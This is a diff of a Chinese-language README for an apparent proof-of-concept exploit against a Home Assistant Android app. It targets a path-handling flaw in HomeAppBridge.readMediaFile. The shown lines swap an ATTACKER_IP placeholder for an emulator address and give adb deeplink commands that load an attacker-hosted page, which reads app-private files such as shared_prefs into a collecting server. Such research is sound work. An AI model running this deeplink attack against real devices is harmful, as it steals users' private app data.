@@ -7,7 +7,7 @@ HomeAppBridge 的 `readMediaFile(fileName)` 方法直接使用 `File(baseDir, fi
 ## 触发方式
 
 ```
-homeassistant://webview?url=http://<ATTACKER_IP>:8000/exp/1.2
+homeassistant://webview?url=http://10.0.2.2:8000/exp/1.2
 ```
 
 ## 启动服务
@@ -33,7 +33,7 @@ python server.py
 1. 启动服务器: `python server.py`
 2. 在模拟器中通过 adb 触发 Deeplink:
    ```
-   adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<本机IP>:8000/exp/1.2"
+   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/1.2"
    ```
 3. 观察 `received/` 目录下生成的回收数据文件
 4. 检查是否成功读取到 App 私有文件内容（如 `shared_prefs/xxx.xml`）
